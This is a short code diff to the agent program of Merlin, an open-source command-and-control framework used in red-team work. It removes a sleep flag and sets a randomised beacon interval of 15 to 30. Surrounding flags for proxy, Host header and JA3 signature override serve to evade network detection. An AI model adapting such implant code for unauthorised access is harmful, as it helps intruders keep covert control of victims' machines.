@@ -22,13 +22,12 @@ import (
 	"flag"
 	"fmt"
 	"os"
-	"time"
 
 	// 3rd Party
 	"github.com/fatih/color"
 
 	// Merlin
-	"github.com/Ne0nd0g/merlin/pkg"
+	merlin "github.com/Ne0nd0g/merlin/pkg"
 	"github.com/Ne0nd0g/merlin/pkg/agent"
 )
 
@@ -51,7 +50,6 @@ func main() {
 	flag.StringVar(&proxy, "proxy", proxy, "Hardcoded proxy to use for http/1.1 traffic only that will override host configuration")
 	flag.StringVar(&host, "host", host, "HTTP Host header")
 	flag.StringVar(&ja3, "ja3", ja3, "JA3 signature string (not the MD5 hash). Overrides -proto flag")
-	sleep := flag.Duration("sleep", 30000*time.Millisecond, "Time for agent to sleep")
 	flag.Usage = usage
 	flag.Parse()
 
@@ -69,7 +67,8 @@ func main() {
 		}
 		os.Exit(1)
 	}
-	a.WaitTime = *sleep
+	a.WaitTimeMin = 15
+	a.WaitTimeMax = 30
 	errRun := a.Run()
 	if errRun != nil {
 		if *verbose {
